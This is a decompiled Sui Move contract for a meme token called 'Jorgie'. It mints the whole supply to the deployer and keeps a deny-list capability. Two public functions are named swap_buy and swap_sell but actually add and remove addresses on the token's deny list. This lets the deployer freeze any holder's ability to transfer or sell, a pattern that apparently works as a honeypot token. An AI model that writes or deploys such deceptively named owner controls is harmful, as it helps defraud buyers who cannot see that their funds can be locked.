module 0x2b57d8e3272c226b27ca219609ea215d61a442010549649f91796dabc0674df::jorgie {
    struct JORGIE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: JORGIE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<JORGIE>(arg0, 9, b"Jorgie", b"MONKEY TAKEN BY POLICE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWBy2Gnf9dTVFMrCZE1v3JYwQhgvZDBkjSPuXRdzTRZGW"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<JORGIE>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JORGIE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<JORGIE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<JORGIE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JORGIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<JORGIE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JORGIE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<JORGIE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

